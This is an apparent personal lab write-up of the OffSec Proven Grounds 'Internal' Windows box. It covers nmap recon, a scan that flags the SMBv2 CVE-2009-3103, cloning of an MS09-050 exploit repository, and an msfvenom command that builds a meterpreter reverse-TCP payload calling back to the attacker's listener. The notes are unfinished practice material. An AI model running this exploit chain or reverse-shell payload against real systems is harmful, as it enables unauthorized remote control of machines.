# Internal - Windows - OffSec - Proven Grounds
Started: July 16, 2026 ~ 1 hr. 

- References:


## Workflow
### Inital Recon
```
Ran the following:
nmap -Pn -T4 -sV --open 192.168.228.40
nmap -sC -sV --open 192.168.228.40

Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-16 20:58 -0400
Nmap scan report for 192.168.228.40
Host is up (0.030s latency).
Not shown: 956 closed tcp ports (reset), 31 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC

nmap --script=vuln 192.168.228.40
...
Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
|_smb-vuln-ms10-054: false
```

### X - CVE-2009-3103
I see SP1 and mention of `CVE-2009-3103` but this is a DoS attack? Let's see what exploits are available and what they do. 

So initially I see exploitdb does have some options but does request `smb.SMBConnection`. 
There is an updated script that does not rely on that module.
https://github.com/Sic4rio/CVE-2009-3103---srv2.sys-SMB-Code-Execution-Python-MS09-050-/tree/main
```
git clone https://github.com/Sic4rio/CVE-2009-3103---srv2.sys-SMB-Code-Execution-Python-MS09-050-/tree/main
# made an edited version
cp MS09-050.py edit-MS09-050.py
mousepad edit-MS09-050.py

msfvemon -p windows/meterpreter/reverse_tcp LHOST=192.168.45.208 LPORT=4444 EXITFUNC=thread -f python -v shell

chmod u+x edit-MS09-050.py

# Ran the exploit, need to have Administator password for this to work
```

**I need to better understand each protocol and how different combinations of each can lead to potential compromise. **
